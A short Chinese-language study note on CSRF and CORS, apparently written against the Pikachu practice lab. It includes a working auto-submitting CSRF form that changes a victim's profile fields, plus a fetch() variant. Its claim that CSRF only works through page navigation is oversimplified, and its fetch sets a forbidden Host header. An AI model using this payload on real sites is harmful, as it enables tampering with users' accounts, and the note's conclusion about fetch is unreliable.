# CSRF CORS迷思








通常情况下，浏览器不会允许在 JavaScript 中控制页面的跳转并同时自定义请求头部，因为这会带来一些潜在的安全问题，例如 CSRF（跨站请求伪造）攻击等。

要記住，CSRF 成功的要件是瀏覽器跳轉 
1.受害者瀏覽器已經有登入過的session
2.攻擊者讓瀏覽器請求get 或post 然後 (跳轉頁面 能不能跳轉這很重要)


為什麼跳轉如此重要，比如CSRF 惡意頁面有a tag 受害者點擊到就會跳轉
```
    <a href="123.com">click</a>
```

因為跳轉是實實在在的讓受害者瀏覽器真的跑去請求，也就沒有什麼CORS（跨域资源共享）和同源策略（Same-Origin Policy）的雜七雜八的問題。

就相當於我們在瀏覽器輸入123.com。 



### 例如這種頁面可以拿來CSRF    form 表單是會跳轉的而且會帶上get 和post

```htmlembedded=
<!DOCTYPE html>
<html>
<head>
  <title>Generated HTML Page</title>
</head>
<body>
  <h1>Generated HTML Page</h1>
  <form id="csrfForm" action="http://pika/vul/csrf/csrfpost/csrf_post_edit.php" method="POST">
    <input type="text" name="sex" value="33">
    <input type="text" name="phonenum" value="33">
    <input type="text" name="add" value="3333">
    <input type="text" name="email" value="7777777777">
    <input type="submit" name="submit" value="submit">
  </form>

  <script type="text/javascript">
      document.querySelector("#csrfForm input[type='submit']").click();
  </script>
</body>
</html>

```

### js fetch 這種就無法CSRF

fetch 是直接請求，但得不到數據
假設我們的網頁是http://www.csrf.html
然後去請求 http://pika/vul/csrf/csrfpost/csrf_post_edit.php

這就相當於A網頁 直接請求B網頁，這根本不同源，所以會收到CORS 錯誤警告


```htmlembedded=
<!DOCTYPE html>
<html>
<head>
  <title>Generated HTML Page</title>
</head>
<body>


<script type="text/javascript">
 fetch('http://pika/vul/csrf/csrfpost/csrf_post_edit.php', {
  method: 'POST',
  headers: {
    'Host': 'pika',
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'sex=33&phonenum=33&add=3333&email=7777777777&submit=submit'
})
.then(response => response.text())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));

</script>
</body>
</html>

```

### 所以記住一定要讓瀏覽器跳轉而不是單純請求。